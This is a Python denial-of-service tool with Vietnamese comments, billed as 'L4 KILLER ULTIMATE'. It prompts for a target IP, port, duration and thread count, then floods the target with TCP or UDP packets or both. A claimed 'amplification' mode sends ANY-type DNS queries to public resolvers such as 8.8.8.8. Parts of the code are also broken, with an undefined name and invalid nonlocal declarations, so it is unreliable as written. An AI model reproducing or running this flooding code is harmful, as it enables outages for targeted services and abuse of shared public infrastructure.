#!/usr/bin/env python3
"""
L4 KILLER ULTIMATE - TCP + UDP FLOOD
Tối ưu cho VPS mạnh, đạt băng thông cao
"""

import socket
import random
import time
import threading
import sys
import os
from concurrent.futures import ThreadPoolExecutor

# Màu sắc
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[94m'
P = '\033[95m'
W = '\033[97m'
RESET = '\033[0m'

def banner():
    print(f"""{C}
╔═══════════════════════════════════════════════════════════════╗
║              L4 KILLER ULTIMATE - QUÂN DEV                    ║
║                 TCP + UDP FLOOD - BĂNG THÔNG CAO              ║
╚═══════════════════════════════════════════════════════════════╝
{RESET}""")

def create_payload(size):
    """Tạo payload ngẫu nhiên"""
    return os.urandom(size)

# ==================== TCP FLOOD ====================
def tcp_flood(target_ip, target_port, duration, threads=100, packet_size=1024):
    """TCP Flood - gửi payload qua TCP"""
    end_time = time.time() + duration
    stats = {'sent': 0, 'errors': 0}
    lock = threading.Lock()
    stop_flag = threading.Event()
    
    def worker():
        local_sent = 0
        while not stop_flag.is_set() and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                
                # Gửi payload liên tục
                while not stop_flag.is_set() and time.time() < end_time:
                    payload = create_payload(packet_size)
                    sock.send(payload)
                    local_sent += 1
                    
                    # Cập nhật stats định kỳ
                    if local_sent % 100 == 0:
                        with lock:
                            stats['sent'] += 100
                            local_sent = 0
                
                sock.close()
            except:
                with lock:
                    stats['errors'] += 1
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    try:
        start = time.time()
        while time.time() < end_time and not stop_flag.is_set():
            time.sleep(1)
            elapsed = time.time() - start
            pps = stats['sent'] / elapsed if elapsed > 0 else 0
            mbps = (stats['sent'] * packet_size * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            print(f"\r{C}[TCP] {G}Packets: {stats['sent']:,} | {Y}PPS: {pps:.0f} | {C}{mbps:.1f} Mbps | {R}Errors: {stats['errors']}{RESET}", end="")
    except KeyboardInterrupt:
        stop_flag.set()
    
    return stats

# ==================== UDP FLOOD ====================
def udp_flood(target_ip, target_port, duration, threads=100, packet_size=1400):
    """UDP Flood - gửi payload qua UDP (nhanh hơn TCP)"""
    end_time = time.time() + duration
    stats = {'sent': 0, 'errors': 0}
    lock = threading.Lock()
    stop_flag = threading.Event()
    
    def worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            return
        
        local_sent = 0
        while not stop_flag.is_set() and time.time() < end_time:
            try:
                payload = create_payload(packet_size)
                sock.sendto(payload, (target_ip, target_port))
                local_sent += 1
                
                if local_sent % 1000 == 0:
                    with lock:
                        stats['sent'] += 1000
                        local_sent = 0
            except:
                with lock:
                    stats['errors'] += 1
        
        sock.close()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    try:
        start = time.time()
        while time.time() < end_time and not stop_flag.is_set():
            time.sleep(1)
            elapsed = time.time() - start
            pps = stats['sent'] / elapsed if elapsed > 0 else 0
            mbps = (stats['sent'] * packet_size * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            print(f"\r{UDP} {G}Packets: {stats['sent']:,} | {Y}PPS: {pps:.0f} | {C}{mbps:.1f} Mbps | {R}Errors: {stats['errors']}{RESET}", end="")
    except KeyboardInterrupt:
        stop_flag.set()
    
    return stats

# ==================== UDP AMPLIFICATION ====================
def udp_amp_flood(target_ip, target_port, duration, threads=100, amp_list=None):
    """UDP Amplification - Dùng DNS/NTP reflector"""
    import socket as sock_lib
    
    if amp_list is None:
        amp_list = [
            '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222',
            '8.26.56.26', '185.228.168.9', '76.76.19.19', '8.8.4.4',
            '1.0.0.1', '94.140.14.14', '94.140.15.15'
        ]
    
    end_time = time.time() + duration
    stats = {'sent': 0, 'errors': 0}
    lock = threading.Lock()
    stop_flag = threading.Event()
    
    # DNS query payload (có thể gây amplification)
    dns_query = bytes([
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
        0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
        0x63, 0x6f, 0x6d, 0x00, 0x00, 0xff, 0x00, 0x01
    ])
    
    def worker():
        try:
            sock = sock_lib.socket(sock_lib.AF_INET, sock_lib.SOCK_DGRAM)
            sock.setsockopt(sock_lib.SOL_SOCKET, sock_lib.SO_REUSEADDR, 1)
            sock.settimeout(1)
        except:
            return
        
        local_sent = 0
        local_errors = 0
        amp_idx = 0
        total_amp = len(amp_list)
        
        while not stop_flag.is_set() and time.time() < end_time:
            try:
                # Chọn reflector
                amp_ip = amp_list[amp_idx % total_amp]
                amp_idx += 1
                
                # Gửi DNS query đến reflector (không phải target)
                sock.sendto(dns_query, (amp_ip, 53))
                local_sent += 1
                
                # Cập nhật stats định kỳ
                if local_sent >= 100:
                    with lock:
                        stats['sent'] += local_sent
                        stats['errors'] += local_errors
                        local_sent = 0
                        local_errors = 0
            except:
                local_errors += 1
        
        # Cập nhật cuối
        with lock:
            stats['sent'] += local_sent
            stats['errors'] += local_errors
        sock.close()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    try:
        start = time.time()
        while time.time() < end_time and not stop_flag.is_set():
            time.sleep(1)
            elapsed = time.time() - start
            pps = stats['sent'] / elapsed if elapsed > 0 else 0
            print(f"\r[UDP AMP] {G}Packets: {stats['sent']:,} | {Y}PPS: {pps:.0f} | {R}Errors: {stats['errors']}{RESET}", end="")
    except KeyboardInterrupt:
        stop_flag.set()
        print()
    
    return stats

# ==================== MULTI FLOOD (TCP + UDP cùng lúc) ====================
def multi_flood(target_ip, target_port, duration, threads=200, packet_size=1024):
    """Tấn công tổng hợp TCP + UDP cùng lúc"""
    print(f"\n{Y}[!] MULTI FLOOD MODE - TCP + UDP cùng lúc{RESET}\n")
    
    # Chạy TCP và UDP song song
    tcp_stats = {'sent': 0, 'errors': 0}
    udp_stats = {'sent': 0, 'errors': 0}
    stop_flag = threading.Event()
    
    def tcp_worker():
        nonlocal tcp_stats
        end_time = time.time() + duration
        while not stop_flag.is_set() and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                for _ in range(100):
                    sock.send(create_payload(packet_size))
                    tcp_stats['sent'] += 1
                sock.close()
            except:
                tcp_stats['errors'] += 1
    
    def udp_worker():
        nonlocal udp_stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while not stop_flag.is_set() and time.time() < end_time:
            try:
                sock.sendto(create_payload(1400), (target_ip, target_port))
                udp_stats['sent'] += 1
            except:
                udp_stats['errors'] += 1
        sock.close()
    
    # Khởi chạy workers
    tcp_threads = [threading.Thread(target=tcp_worker) for _ in range(threads//2)]
    udp_threads = [threading.Thread(target=udp_worker) for _ in range(threads//2)]
    
    for t in tcp_threads + udp_threads:
        t.start()
    
    try:
        start = time.time()
        while time.time() < start + duration:
            time.sleep(1)
            elapsed = time.time() - start
            tcp_mbps = (tcp_stats['sent'] * packet_size * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            udp_mbps = (udp_stats['sent'] * 1400 * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            print(f"\r{C}[TCP] {W}{tcp_stats['sent']:,} packets | {tcp_mbps:.1f} Mbps  {C}[UDP] {W}{udp_stats['sent']:,} packets | {udp_mbps:.1f} Mbps{RESET}", end="")
    except KeyboardInterrupt:
        stop_flag.set()
    
    return {'tcp': tcp_stats, 'udp': udp_stats}

# ==================== MAIN ====================
def main():
    banner()
    
    target_ip = input(f"{C}🎯 IP Target: {RESET}").strip()
    if not target_ip:
        print(f"{R}❌ Chưa nhập IP!{RESET}")
        return
    
    try:
        target_port = int(input(f"{C}🔌 Port Target: {RESET}").strip())
        if target_port <= 0 or target_port > 65535:
            print(f"{R}❌ Port không hợp lệ!{RESET}")
            return
    except:
        print(f"{R}❌ Port không hợp lệ!{RESET}")
        return
    
    try:
        duration = int(input(f"{C}⏱️ Thời gian (giây): {RESET}").strip())
        if duration <= 0:
            duration = 60
    except:
        duration = 60
    
    print(f"\n{P}{'='*55}{RESET}")
    print(f"{Y}🔥 CHỌN PHƯƠNG THỨC TẤN CÔNG:{RESET}")
    print(f"   {C}1.{RESET} TCP Flood - Tấn công kết nối")
    print(f"   {C}2.{RESET} UDP Flood - Tấn công băng thông (nhanh hơn)")
    print(f"   {C}3.{RESET} UDP Amplification - DNS Reflector (mạnh nhất)")
    print(f"   {C}4.{RESET} MULTI Flood - TCP + UDP cùng lúc")
    print(f"{P}{'='*55}{RESET}")
    
    choice = input(f"{C}👉 Chọn (1-4): {RESET}").strip() or "2"
    
    try:
        threads = int(input(f"{C}🧵 Số luồng (1-1000): {RESET}").strip())
        if threads < 1:
            threads = 200
        if threads > 1000:
            threads = 1000
    except:
        threads = 200
    
    if choice in ['1', '2', '4']:
        try:
            packet_size = int(input(f"{C}📦 Kích thước packet (64-65535): {RESET}").strip())
            if packet_size < 64:
                packet_size = 1024
            if packet_size > 65535:
                packet_size = 65535
        except:
            packet_size = 1024 if choice == '1' else 1400
    
    print(f"\n{Y}[!] TARGET: {target_ip}:{target_port}")
    print(f"[!] Thời gian: {duration}s")
    print(f"[!] Threads: {threads}")
    if choice in ['1', '2', '4']:
        print(f"[!] Packet size: {packet_size} bytes ({packet_size/1024:.1f} KB)")
    print(f"[!] Method: {['TCP', 'UDP', 'UDP AMP', 'MULTI'][int(choice)-1]}{RESET}")
    
    confirm = input(f"\n{R}⚠️ BẮT ĐẦU TẤN CÔNG? (y/n): {RESET}").lower()
    if confirm != 'y':
        print(f"{Y}[!] Đã hủy{RESET}")
        return
    
    print(f"\n{G}[+] ĐANG TẤN CÔNG...{RESET}\n")
    
    start_time = time.time()
    
    if choice == '1':
        stats = tcp_flood(target_ip, target_port, duration, threads, packet_size)
        elapsed = duration
    elif choice == '2':
        stats = udp_flood(target_ip, target_port, duration, threads, packet_size)
        elapsed = duration
    elif choice == '3':
        stats = udp_amp_flood(target_ip, target_port, duration, threads)
        elapsed = duration
    else:
        stats = multi_flood(target_ip, target_port, duration, threads, packet_size)
        elapsed = duration
    
    print(f"\n\n{G}{'='*55}{RESET}")
    print(f"{G}✅ TẤN CÔNG HOÀN TẤT!{RESET}")
    print(f"{G}{'='*55}{RESET}")
    
    if choice == '4':
        print(f"{C}📊 TCP:{RESET} {stats['tcp']['sent']:,} packets | {R}Errors: {stats['tcp']['errors']}{RESET}")
        print(f"{C}📊 UDP:{RESET} {stats['udp']['sent']:,} packets | {R}Errors: {stats['udp']['errors']}{RESET}")
        total = stats['tcp']['sent'] + stats['udp']['sent']
    else:
        print(f"{C}📊 Tổng packets:{RESET} {stats['sent']:,}")
        print(f"{C}❌ Lỗi:{RESET} {stats['errors']:,}")
        total = stats['sent']
    
    print(f"{C}🚀 Tốc độ TB:{RESET} {total/elapsed:.0f} pps")
    print(f"{C}⏱️ Thời gian:{RESET} {elapsed:.1f}s")
    print(f"{G}{'='*55}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Dừng bởi người dùng{RESET}")
    except Exception as e:
        print(f"{R}❌ Lỗi: {e}{RESET}")